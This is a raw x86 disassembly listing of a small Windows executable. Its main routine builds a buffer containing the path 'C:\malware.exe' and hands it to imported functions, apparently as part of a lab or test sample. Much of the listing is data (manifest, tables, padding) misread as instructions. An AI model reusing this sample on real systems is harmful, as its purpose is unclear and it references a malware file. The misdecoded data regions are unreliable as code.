add    %cl,%fs:0x2(%edi)
inc    %edi
gs je  0x4029a5
jns    0x4029c7
je     0x4029bb
insl   (%dx),%es:(%edi)
push   %esp
imul   $0x69467341,0x65(%ebp),%ebp
insb   (%dx),%es:(%edi)
gs push %esp
.byte 0x69
insl   (%dx),%es:(%edi)
gs
.byte 0x0




dec    %esi
out    %al,$0x40
mov    $0x44bf19b1,%ebx
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
incl   (%ecx)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
.byte 0x0




add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
sbb    %al,(%eax)
add    %al,(%eax)
sbb    %al,(%eax)
add    %al,0x0(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
xor    %al,(%eax)
add    %al,0x0(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
or     %eax,(%eax,%eax,1)
add    %cl,0x0(%eax)
add    %al,(%eax)
pop    %eax
inc    %eax
add    %al,(%eax)
push   %esi
add    (%eax),%al
add    %ah,%ah
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %bh,(%ecx,%eiz,2)
jae    0x4040cf
gs insl (%dx),%es:(%edi)
bound  %ebp,0x20(%ecx,%edi,2)
js     0x4040d1
insb   (%dx),%es:(%edi)
outsb  %ds:(%esi),(%dx)
jae    0x4040a5
and    0x72(%ebp),%dh
outsb  %ds:(%esi),(%dx)
cmp    0x63(%ebx),%dh
push   $0x73616d65
sub    $0x7263696d,%eax
outsl  %ds:(%esi),(%dx)
jae    0x4040eb
data16 je 0x4040ac
arpl   %bp,0x6d(%edi)
cmp    0x73(%ecx),%ah
insl   (%dx),%es:(%edi)
jbe,pn 0x4040ba
and    (%eax),%ah
insl   (%dx),%es:(%edi)
popa   
outsb  %ds:(%esi),(%dx)
imul   $0x65567473,0x65(%esi),%esp
jb     0x40410a
imul   $0x2e31223d,0x6e(%edi),%ebp
xor    %ah,(%edx)
ds or  $0x3c20200a,%eax
je     0x40411a
jne    0x40411d
je     0x4040f5
outsb  %ds:(%esi),(%dx)
outsw  %ds:(%esi),(%dx)
and    %bh,0x6d(%eax)
insb   (%dx),%es:(%edi)
outsb  %ds:(%esi),(%dx)
jae    0x4040f3
and    0x72(%ebp),%dh
outsb  %ds:(%esi),(%dx)
cmp    0x63(%ebx),%dh
push   $0x73616d65
sub    $0x7263696d,%eax
outsl  %ds:(%esi),(%dx)
jae    0x404139
data16 je 0x4040fa
arpl   %bp,0x6d(%edi)
cmp    0x73(%ecx),%ah
insl   (%dx),%es:(%edi)
jbe,pn 0x40410a
and    (%esi),%bh
or     $0x2020200a,%eax
and    %bh,(%ebx,%esi,2)
arpl   %si,%gs:0x72(%ebp)
imul   $0x20200a0d,0x3e(%ecx,%edi,2),%esi

and    %ah,(%eax)
and    %ah,(%eax)
cmp    $0x72,%al
gs jno 0x40416b
gs jae 0x40416d
gs fs push %eax
jb     0x404167
jbe    0x404169
insb   (%dx),%es:(%edi)
gs addr16 gs jae 0x404144
or     $0x2020200a,%eax
and    %ah,(%eax)
and    %ah,(%eax)
and    %bh,(%edx,%esi,2)
gs jno 0x40418a
gs jae 0x40418c
gs fs inc %ebp
js     0x404182
arpl   %si,0x74(%ebp)
imul   $0x6576654c,0x6e(%edi),%ebp
insb   (%dx),%es:(%edi)
and    %ch,0x76(%ebp,%eiz,2)
gs insb (%dx),%es:(%edi)
cmp    $0x49736122,%eax
outsb  %ds:(%esi),(%dx)
jbe    0x4041a5
imul   $0x22,0x72(%ebp),%esp
and    %dh,0x69(%ebp)
inc    %ecx
arpl   %sp,0x65(%ebx)
jae    0x4041b6
cmp    $0x6c616622,%eax
jae    0x4041af
and    (%esi),%bh
cmp    $0x2f,%al
jb     0x4041b5
jno    0x4041c7
gs jae 0x4041c9
gs fs inc %ebp
js     0x4041bf
arpl   %si,0x74(%ebp)
imul   $0x6576654c,0x6e(%edi),%ebp
insb   (%dx),%es:(%edi)
ds or  $0x2020200a,%eax
and    %ah,(%eax)
and    %bh,(%edi,%ebp,1)
jb     0x4041d7
jno    0x4041e9
gs jae 0x4041eb
gs fs push %eax
jb     0x4041e5
jbe    0x4041e7
insb   (%dx),%es:(%edi)
gs addr16 gs jae 0x4041c2
or     $0x2020200a,%eax
and    %bh,(%edi,%ebp,1)
jae    0x4041f3
arpl   %si,0x72(%ebp)
imul   $0x20200a0d,0x3e(%ecx,%edi,2),%esi

cmp    $0x2f,%al
je     0x40420f
jne    0x404212
je     0x4041ea
outsb  %ds:(%esi),(%dx)
outsw  %ds:(%esi),(%dx)
ds or  $0x3c20200a,%eax
fs gs jo 0x404213
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
arpl   %di,0x3e(%ecx)
or     $0x2020200a,%eax
and    %bh,(%esp,%eiz,2)
gs jo  0x404225
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
je     0x404207
jae    0x40423b
gs insl (%dx),%es:(%edi)
bound  %ebp,0x3e(%ecx,%edi,2)
or     $0x2020200a,%eax
and    %ah,(%eax)
and    %bh,(%ecx,%eiz,2)
jae    0x40424d
gs insl (%dx),%es:(%edi)
bound  %ebp,0x49(%ecx,%edi,2)
fs outsb %gs:(%esi),(%dx)
je     0x40424e
je     0x404260
and    %dh,0x70(%ecx,%edi,2)
gs cmp $0x6e697722,%eax
xor    (%edx),%esi
and    (%eax),%ah
outsb  %ds:(%esi),(%dx)
popa   
insl   (%dx),%es:(%edi)
gs cmp $0x63694d22,%eax
jb     0x40426f
jae    0x404271
data16 je 0x404233
push   %esi
inc    %ebx
cmp    %esi,(%eax)
cs inc %ebx
push   %edx
push   %esp
and    (%eax),%ah
jbe    0x404276
jb     0x404286
imul   $0x2e39223d,0x6e(%edi),%ebp
xor    %ch,(%esi)
xor    (%ecx),%dh
xor    %dh,(%edx)
xor    (%esi),%ch
cmp    %ah,(%edx)
and    %dh,0x72(%eax)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x73(%ebp)
jae    0x40429c
jb     0x404270
jb     0x404294
push   $0x63657469
je     0x4042ad
jb     0x40429f
cmp    $0x36387822,%eax
and    (%eax),%ah
jo     0x4042b8
bound  %ebp,0x63(%ecx,%ebp,2)
dec    %ebx
gs jns 0x40429f
outsl  %ds:(%esi),(%dx)
imul   $0x3d,0x6e(%ebp),%esp
and    (%ecx),%dh
data16 arpl %di,(%eax)
bound  %esi,(%ebx)
bound  %edi,(%ecx)
popa   
xor    %esp,0x31(%ebp)
cmp    %ah,0x33(%ebp)
bound  %esp,(%edx)
ds cmp $0x2f,%al
popa   
jae    0x4042db
gs insl (%dx),%es:(%edi)
bound  %ebp,0x49(%ecx,%edi,2)
fs outsb %gs:(%esi),(%dx)
je     0x4042dc
je     0x4042ee
ds or  $0x2020200a,%eax
and    %bh,(%edi,%ebp,1)
fs gs jo 0x4042e7
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
je     0x4042c9
jae    0x4042fd
gs insl (%dx),%es:(%edi)
bound  %ebp,0x3e(%ecx,%edi,2)
or     $0x3c20200a,%eax
das    
fs gs jo 0x4042ff
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
arpl   %di,0x3e(%ecx)
or     $0x612f3c0a,%eax
jae    0x40431b
gs insl (%dx),%es:(%edi)
bound  %ebp,0x3e(%ecx,%edi,2)
push   %eax
inc    %ecx




add    %dl,(%eax)
add    %al,(%eax)
jo     0x405007
add    %al,(%eax)
jae    0x40503a
(bad)  
xor    %cl,-0x65cf6bd0(%esi)
xor    %ah,-0x47cf57d0(%edx)
xor    %bh,-0x1ccf27d0(%esi)
xor    %ch,%ch
xor    %al,0x4e310b31
xor    %ebx,0x31(%ebx)
popa   
xor    %ebp,0x31(%ecx)
outsl  %ds:(%esi),(%dx)
xor    %esi,0x31(%edi)
jge    0x405063
test   %esi,(%ecx)
sbb    %dh,(%edx)
push   %ds
xor    0x32(%eax),%al
ret    
xor    %bl,%cl
xor    %bh,%bh
xor    0x2b332433,%al
xor    (%esi),%edi
xor    0x33(%edi),%ecx
pop    %eax
xor    0x33(%ebp),%ebp
ja     0x405083
mov    %esi,(%ebx)
xchg   %eax,%ebx
xor    -0x44cc5fcd(%ecx),%ebx
xor    %edx,%ecx
xor    %edi,%ecx
xor    %ecx,%ebx
xor    %eax,%esp
xor    %esi,%esp
xor    %ebx,%ebp
xor    %eax,%esi
xor    %ebp,%esi
xor    %edx,%edi
xor    (%eax),%eax
xor    $0x8,%al
xor    $0x1c,%al
xor    $0x37,%al
xor    $0x40,%al
xor    $0x5b,%al
xor    $0x65,%al
xor    $0x78,%al
xor    $0x82,%al
xor    $0x87,%al
xor    $0x8c,%al
xor    $0xae,%al
xor    $0xb3,%al
xor    $0xbc,%al
xor    $0xc1,%al
xor    $0xce,%al
xor    $0xdf,%al
xor    $0xe5,%al
xor    $0xec,%al
xor    $0x0,%al
xor    $0x350b3505,%eax
adc    0x351f3519,%esi
sub    $0x35,%al
xor    0x355a353b,%dh
bound  %esi,0x3571356b
jns    0x4050e3
test   %esi,0x35a23597
test   $0x35,%al
icebp  
xor    $0x35ff35f7,%eax
push   %es
or     %ss:(%esi),%esi
adc    %esi,(%esi)
pop    %ss
ss pop %ds
ss and $0x33362c36,%eax
ss inc %ebx
ss dec %ebx
ss push %ecx
ss pop %ebp
ss push $0x8c368636
ss xchg %eax,%edx
ss cwtl 
ss sahf 
movsb  %ss:(%esi),%es:(%edi)
ss stos %eax,%es:(%edi)
ss mov $0x36,%dl
mov    $0xc736c036,%ecx
ss into 
ss aad $0x36
fnsave (%esi)
in     $0x36,%eax
in     (%dx),%eax
ss stc 
add    %ss:(%edi),%dh
pop    %es
aaa    
or     $0x20371737,%eax
aaa    
sub    (%edi),%esi
aaa    
aaa    
cmp    $0x37,%al
dec    %esp
aaa    
push   %ecx
aaa    
push   %edi
aaa    
pop    %ebp
aaa    
jae    0x405149
jp     0x40514b
ret    
aaa    
leave  
aaa    
(bad)  
aaa    
fnstenv (%edi)
in     $0x37,%al
ljmp   $0x1e38,$0x1337fe37
cmp    %dh,(%esi)
cmp    %cl,0x59(%eax,%edi,1)
cmp    %dl,-0x43c764c8(%esi)
cmp    %al,%cl
cmp    %ah,%al
cmp    %cl,-0x60c672c7(%eax)
cmp    %edi,-0x28c62ec7(%ebp)
cmp    %eax,0x3a(%eax)
inc    %esi
cmp    0x3a(%ebp),%cl
push   $0x3a
mov    $0x3a,%bh
mov    $0x243b013a,%esp
cmp    (%ecx),%esi
cmp    0x4d3b453b,%edi
cmp    0x3b(%ecx),%ebx
jge    0x405199
test   %edi,(%ebx)
nop
cmp    -0x5dc463c5(%esi),%edx
cmp    -0x4bc451c5(%eax),%ebp
cmp    0x20003b(%edx),%edi
add    %ah,(%eax)
add    %al,(%eax)
add    %dl,%ah
xor    %ah,%al
xor    %ah,%ah
xor    %cl,(%ecx,%esi,1)
adc    %dh,(%ecx)
mov    $0x7c33c033,%esp
xor    $0x80,%al
xor    $0xa0,%al
xor    $0xbc,%al
xor    $0xc0,%al
xor    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
.byte 0x0







push   %ebp
mov    %esp,%ebp
and    $0xfffffff8,%esp
push   $0xffffffff
push   $0x401eb0
mov    %fs:0x0,%eax
push   %eax
sub    $0x15c,%esp
mov    0x403000,%eax
xor    %esp,%eax
mov    %eax,0x154(%esp)
push   %ebx
push   %esi
mov    0x403000,%eax
xor    %esp,%eax
push   %eax
lea    0x168(%esp),%eax
mov    %eax,%fs:0x0
xor    %ecx,%ecx
push   $0x2
mov    $0x7fff,%eax
pop    %edx
mov    %eax,0x10(%esp)
mul    %edx
seto   %cl
neg    %ecx
or     %eax,%ecx
push   %ecx
call   0x4016ae
pop    %ecx
lea    0x10(%esp),%ecx
push   %ecx
push   %eax
call   *0x402000
test   %eax,%eax
jne    0x40109f
push   $0x402124
call   *0x4020bc
xor    %eax,%eax
pop    %ecx
inc    %eax
mov    0x168(%esp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %esi
pop    %ebx
mov    0x154(%esp),%ecx
xor    %esp,%ecx
call   0x40169f
mov    %ebp,%esp
pop    %ebp
ret    
xor    %ebx,%ebx
movb   $0x1,0x9c(%esp)

movb   $0x5,0x9d(%esp)

movb   $0x1,0x9e(%esp)

mov    %bl,0x9f(%esp)
movb   $0xa9,0xa0(%esp)

movb   $0xc6,0xa1(%esp)

movb   $0xa1,0xa2(%esp)

movb   $0x81,0xa3(%esp)

movb   $0x92,0xa4(%esp)

movb   $0x31,0xa5(%esp)

movb   $0x5a,0xa6(%esp)

movb   $0x4a,0xa7(%esp)

movb   $0xb2,0xa8(%esp)

movb   $0x8a,0xa9(%esp)

movb   $0x52,0xaa(%esp)

movb   $0x65,0xab(%esp)

movb   $0x22,0xac(%esp)

movb   $0x20,0xad(%esp)

movb   $0xc0,0xae(%esp)

movb   $0xd4,0xaf(%esp)

movb   $0x46,0xb0(%esp)

mov    %bl,0xb1(%esp)
movb   $0x8e,0xb2(%esp)

mov    %bl,0xb3(%esp)
mov    %bl,0xb4(%esp)
mov    %bl,0xb5(%esp)
mov    %bl,0xb6(%esp)
mov    %bl,0xb7(%esp)
movb   $0x3c,0xb8(%esp)

mov    %bl,0xb9(%esp)
movb   $0xa,0xba(%esp)

mov    %bl,0xbb(%esp)
movb   $0x20,0xbc(%esp)

mov    %bl,0xbd(%esp)
mov    %bl,0xbe(%esp)
mov    %bl,0xbf(%esp)
mov    %bl,0xc0(%esp)
movb   $0x14,0xc1(%esp)

movb   $0x73,0xc2(%esp)

movb   $0xf,0xc3(%esp)

mov    %bl,0xc4(%esp)
mov    %bl,0xc5(%esp)
mov    %bl,0xc6(%esp)
mov    %bl,0xc7(%esp)
movb   $0x3,0xc8(%esp)

movb   $0x13,0xc9(%esp)

movb   $0x4,0xca(%esp)

mov    %bl,0xcb(%esp)
movb   $0xc0,0xcc(%esp)

mov    %bl,0xcd(%esp)
movb   $0x80,0xce(%esp)

movb   $0x21,0xcf(%esp)

mov    %bl,0xd0(%esp)
mov    %bl,0xd1(%esp)
mov    %bl,0xd2(%esp)
mov    %bl,0xd3(%esp)
mov    %bl,0xd4(%esp)
mov    %bl,0xd5(%esp)
mov    %bl,0xd6(%esp)
mov    %bl,0xd7(%esp)
mov    %bl,0xd8(%esp)
mov    %bl,0xd9(%esp)
mov    %bl,0xda(%esp)
mov    %bl,0xdb(%esp)
mov    %bl,0xdc(%esp)
mov    %bl,0xdd(%esp)
mov    %bl,0xde(%esp)
mov    %bl,0xdf(%esp)
mov    %bl,0xe0(%esp)
mov    %bl,0xe1(%esp)
movb   $0xf,0xe2(%esp)

mov    %bl,0xe3(%esp)
movb   $0x43,0xe4(%esp)

mov    %bl,0xe5(%esp)
movb   $0x3a,0xe6(%esp)

mov    %bl,0xe7(%esp)
movb   $0x5c,0xe8(%esp)

mov    %bl,0xe9(%esp)
movb   $0x6d,0xea(%esp)

mov    %bl,0xeb(%esp)
movb   $0x61,0xec(%esp)

mov    %bl,0xed(%esp)
movb   $0x6c,0xee(%esp)

mov    %bl,0xef(%esp)
movb   $0x77,0xf0(%esp)

mov    %bl,0xf1(%esp)
movb   $0x61,0xf2(%esp)

mov    %bl,0xf3(%esp)
movb   $0x72,0xf4(%esp)

mov    %bl,0xf5(%esp)
movb   $0x65,0xf6(%esp)

mov    %bl,0xf7(%esp)
movb   $0x2e,0xf8(%esp)

mov    %bl,0xf9(%esp)
movb   $0x65,0xfa(%esp)

mov    %bl,0xfb(%esp)
movb   $0x78,0xfc(%esp)

mov    %bl,0xfd(%esp)
movb   $0x65,0xfe(%esp)

mov    %bl,0xff(%esp)
mov    %bl,0x100(%esp)
mov    %bl,0x101(%esp)
mov    %bl,0x102(%esp)
mov    %bl,0x103(%esp)
movb   $0x4,0x104(%esp)

mov    %bl,0x105(%esp)
movb   $0x43,0x106(%esp)

mov    %bl,0x107(%esp)
movb   $0x3a,0x108(%esp)

mov    %bl,0x109(%esp)
movb   $0x5c,0x10a(%esp)

mov    %bl,0x10b(%esp)
mov    %bl,0x10c(%esp)
mov    %bl,0x10d(%esp)
movb   $0x6,0x10e(%esp)

mov    %bl,0x10f(%esp)
movb   $0x56,0x110(%esp)

mov    %bl,0x111(%esp)
movb   $0x69,0x112(%esp)

mov    %bl,0x113(%esp)
movb   $0x76,0x114(%esp)

mov    %bl,0x115(%esp)
movb   $0x65,0x116(%esp)

mov    %bl,0x117(%esp)
movb   $0x6b,0x118(%esp)

mov    %bl,0x119(%esp)
mov    %bl,0x11a(%esp)
mov    %bl,0x11b(%esp)
mov    %bl,0x11c(%esp)
mov    %bl,0x11d(%esp)
mov    %bl,0x11e(%esp)
mov    %bl,0x11f(%esp)
movb   $0x8,0x120(%esp)

mov    %bl,0x121(%esp)
movb   $0x3,0x122(%esp)

movb   $0x13,0x123(%esp)

movb   $0x4,0x124(%esp)

mov    %bl,0x125(%esp)
mov    %bl,0x126(%esp)
mov    %bl,0x127(%esp)
mov    %bl,0x128(%esp)
mov    %bl,0x129(%esp)
movb   $0x1,0x12a(%esp)

mov    %bl,0x12b(%esp)
movb   $0x30,0x12c(%esp)

mov    %bl,0x12d(%esp)
mov    %bl,0x12e(%esp)
mov    %bl,0x12f(%esp)
movb   $0xdd,0x130(%esp)

movb   $0x7,0x131(%esp)

movb   $0x4,0x132(%esp)

mov    %bl,0x133(%esp)
movb   $0x1,0x134(%esp)

mov    %bl,0x135(%esp)
mov    %bl,0x136(%esp)
mov    %bl,0x137(%esp)
mov    %bl,0x138(%esp)
mov    %bl,0x139(%esp)
mov    %bl,0x13a(%esp)
mov    %bl,0x13b(%esp)
mov    %bl,0x13c(%esp)
push   $0x1
push   $0x40
push   $0x20
push   $0x402144
lea    0x24(%esp),%ecx
mov    %bl,0x14d(%esp)
mov    %bl,0x14e(%esp)
mov    %bl,0x14f(%esp)
mov    %bl,0x150(%esp)
mov    %bl,0x151(%esp)
mov    %bl,0x152(%esp)
mov    %bl,0x153(%esp)
mov    %bl,0x154(%esp)
mov    %bl,0x155(%esp)
mov    %bl,0x156(%esp)
mov    %bl,0x157(%esp)
mov    %bl,0x158(%esp)
mov    %bl,0x159(%esp)
mov    %bl,0x15a(%esp)
mov    %bl,0x15b(%esp)
movb   $0x6,0x15c(%esp)

mov    %bl,0x15d(%esp)
mov    %bl,0x15e(%esp)
mov    %bl,0x15f(%esp)
movb   $0x1,0x160(%esp)

mov    %bl,0x161(%esp)
mov    %bl,0x162(%esp)
mov    %bl,0x163(%esp)
mov    %bl,0x164(%esp)
mov    %bl,0x165(%esp)
mov    %bl,0x166(%esp)
mov    %bl,0x167(%esp)
mov    %bl,0x168(%esp)
mov    %bl,0x169(%esp)
mov    %bl,0x16a(%esp)
mov    %bl,0x16b(%esp)
call   *0x402040
mov    %ebx,0x170(%esp)
cmp    %ebx,0x64(%esp)
jne    0x401663
inc    %ebx
orl    $0xffffffff,0x170(%esp)

lea    0x14(%esp),%ecx
call   *0x402044
mov    %ebx,%eax
jmp    0x40107c
xor    %esi,%esi
movzbl 0x9c(%esp,%esi,1),%eax

push   %eax
lea    0x18(%esp),%ecx
call   *0x402048
inc    %esi
cmp    $0xc0,%esi
jl     0x401665
lea    0x14(%esp),%ecx
call   *0x40204c
lea    0x14(%esp),%ecx
call   *0x402050
jmp    0x40164a
call   0x401000
xor    %eax,%eax
ret    
cmp    0x403000,%ecx
jne    0x4016a9
repz ret 
jmp    0x401960
jmp    *0x4020c0
push   $0x401b9e
call   0x401b61
mov    0x40336c,%eax
movl   $0x403034,(%esp)
pushl  0x403368
mov    %eax,0x403034
push   $0x403024
push   $0x403028
push   $0x403020
call   *0x4020b4
add    $0x14,%esp
mov    %eax,0x403030
test   %eax,%eax
jge    0x4016fe
push   $0x8
call   0x401ab6
pop    %ecx
ret    
push   $0x10
push   $0x402248
call   0x401d2c
xor    %ebx,%ebx
mov    %ebx,-0x4(%ebp)
mov    %fs:0x18,%eax
mov    0x4(%eax),%esi
mov    %ebx,-0x1c(%ebp)
mov    $0x403384,%edi
push   %ebx
push   %esi
push   %edi
call   *0x402030
cmp    %ebx,%eax
je     0x401747
cmp    %esi,%eax
jne    0x40173a
xor    %esi,%esi
inc    %esi
mov    %esi,-0x1c(%ebp)
jmp    0x40174a
push   $0x3e8
call   *0x402034
jmp    0x401721
xor    %esi,%esi
inc    %esi
mov    0x403380,%eax
cmp    %esi,%eax
jne    0x40175d
push   $0x1f
call   0x401ab6
pop    %ecx
jmp    0x401798
mov    0x403380,%eax
test   %eax,%eax
jne    0x401792
mov    %esi,0x403380
push   $0x4020e8
push   $0x4020dc
call   0x401d24
pop    %ecx
pop    %ecx
test   %eax,%eax
je     0x401798
movl   $0xfffffffe,-0x4(%ebp)
mov    $0xff,%eax
jmp    0x40186f
mov    %esi,0x40303c
mov    0x403380,%eax
cmp    %esi,%eax
jne    0x4017bc
push   $0x4020d8
push   $0x4020d0
call   0x401d1e
pop    %ecx
pop    %ecx
movl   $0x2,0x403380

cmp    %ebx,-0x1c(%ebp)
jne    0x4017c9
push   %ebx
push   %edi
call   *0x402038
cmp    %ebx,0x403390
je     0x4017ea
push   $0x403390
call   0x401c60
pop    %ecx
test   %eax,%eax
je     0x4017ea
push   %ebx
push   $0x2
push   %ebx
call   *0x403390
mov    0x403024,%eax
mov    0x4020a0,%ecx
mov    %eax,(%ecx)
pushl  0x403024
pushl  0x403028
pushl  0x403020
call   0x401697
add    $0xc,%esp
mov    %eax,0x403038
cmp    %ebx,0x40302c
jne    0x401855
push   %eax
call   *0x4020a4
mov    -0x14(%ebp),%eax
mov    (%eax),%ecx
mov    (%ecx),%ecx
mov    %ecx,-0x20(%ebp)
push   %eax
push   %ecx
call   0x401bc4
pop    %ecx
pop    %ecx
ret    
mov    -0x18(%ebp),%esp
mov    -0x20(%ebp),%eax
mov    %eax,0x403038
xor    %ebx,%ebx
cmp    %ebx,0x40302c
jne    0x401855
push   %eax
call   *0x4020ac
cmp    %ebx,0x40303c
jne    0x401863
call   *0x4020b0
movl   $0xfffffffe,-0x4(%ebp)
mov    0x403038,%eax
call   0x401d71
ret    
mov    $0x5a4d,%eax
cmp    %ax,0x400000
je     0x401887
xor    %eax,%eax
jmp    0x4018d4
mov    0x40003c,%eax
lea    0x400000(%eax),%eax
cmpl   $0x4550,(%eax)
jne    0x401883
movzwl 0x18(%eax),%ecx
cmp    $0x10b,%ecx
je     0x4018c1
cmp    $0x20b,%ecx
jne    0x401883
cmpl   $0xe,0x84(%eax)
jbe    0x401883
xor    %ecx,%ecx
cmp    %ecx,0xf8(%eax)
jmp    0x4018cf
cmpl   $0xe,0x74(%eax)
jbe    0x401883
xor    %ecx,%ecx
cmp    %ecx,0xe8(%eax)
setne  %cl
mov    %ecx,%eax
push   $0x1
mov    %eax,0x40302c
call   *0x402080
push   $0xffffffff
call   *0x402084
pop    %ecx
pop    %ecx
mov    %eax,0x403388
mov    %eax,0x40338c
call   *0x402088
